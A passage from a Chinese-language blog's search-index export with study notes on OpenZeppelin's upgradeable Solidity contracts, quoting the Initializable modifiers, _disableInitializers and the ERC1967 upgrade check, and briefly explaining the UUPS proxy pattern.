(StorageSlot.getBooleanSlot(_ROLLBACK_SLOT).value) &#123;        _setImplementation(newImplementation);    &#125; else &#123;        try IERC1822Proxiable(newImplementation).proxiableUUID() returns (bytes32 slot) &#123;            require(slot == _IMPLEMENTATION_SLOT, &quot;ERC1967Upgrade: unsupported proxiableUUID&quot;);        &#125; catch &#123;            revert(&quot;ERC1967Upgrade: new implementation is not UUPS&quot;);        &#125;        _upgradeToAndCall(newImplementation, data, forceCall);    &#125;&#125;</code></pre><hr><h2 id="Contract-Initializable"><a href="#Contract-Initializable" class="headerlink" title="Contract Initializable"></a>Contract Initializable</h2><p>用于帮助编写可升级的合约或将要部署的任何类型的合约部署在代理后面</p><p>初始化函数使用版本号。一旦使用了版本号，它就会被使用，并且不能 重用。此机制可防止重新执行每个“步骤”</p><pre><code>function isConstructor() private view returns (bool) &#123;    address self = address(this);    uint256 cs;    assembly &#123; cs := extcodesize(self) &#125; //检查当前地址代码量    return cs == 0;&#125;</code></pre><p>修饰符：</p><pre><code> modifier initializer() &#123;    require(initializing || isConstructor() || !initialized, &quot;Contract instance has already been initialized&quot;);    bool isTopLevelCall = !initializing;    if (isTopLevelCall) &#123;    initializing = true;    initialized = true;    &#125;    _;  //执行完函数体 initializing状态改变    if (isTopLevelCall) &#123;    initializing = false;    &#125;&#125;</code></pre><h2 id="abstract-contract-Initializable"><a href="#abstract-contract-Initializable" class="headerlink" title="abstract contract Initializable"></a>abstract contract Initializable</h2><p>三个修饰符<br>1.只在进行中</p><pre><code> modifier onlyInitializing() &#123;    require(_initializing, &quot;Initializable: contract is not initializing&quot;);    _;&#125;</code></pre><p>2.更新版本</p><pre><code>modifier reinitializer(uint8 version) &#123;    require(!_initializing &amp;&amp; _initialized &lt; version, &quot;Initializable: contract is already initialized&quot;);    _initialized = version;    _initializing = true;    _;    _initializing = false;    emit Initialized(version);&#125;</code></pre><p>3.初始化</p><pre><code>modifier initializer() &#123;    bool isTopLevelCall = !_initializing;    require(        (isTopLevelCall &amp;&amp; _initialized &lt; 1) || (!Address.isContract(address(this)) &amp;&amp; _initialized == 1),        &quot;Initializable: contract is already initialized&quot;    );    //需要从来没有初始化，或者更新版本为1    _initialized = 1;    if (isTopLevelCall) &#123;        _initializing = true;    &#125;    _;    if (isTopLevelCall) &#123;        _initializing = false;        emit Initialized(1);    &#125;&#125;</code></pre><p>函数：报废</p><pre><code>function _disableInitializers() internal virtual &#123;    require(!_initializing, &quot;Initializable: contract is initializing&quot;);    if (_initialized != type(uint8).max) &#123;        _initialized = type(uint8).max;        emit Initialized(type(uint8).max);    &#125;&#125;</code></pre><hr><h2 id="OpenZepplin的UUPS代理模式"><a href="#OpenZepplin的UUPS代理模式" class="headerlink" title="OpenZepplin的UUPS代理模式"></a>OpenZepplin的UUPS代理模式</h2><p>轻量级又通用<br>UUPS 代理中，升级由实现处理，最终可以删除<br>UUPS 代理是使用ERC1967Proxy。实现的作用是，除了合约的逻辑之外，还包括更新存储在代理存储空间中特定插槽中的实现地址所需的所有代码。</p>]]></content>
      
      
      <categories>
          
          <category> solidity learning </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 标签1 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
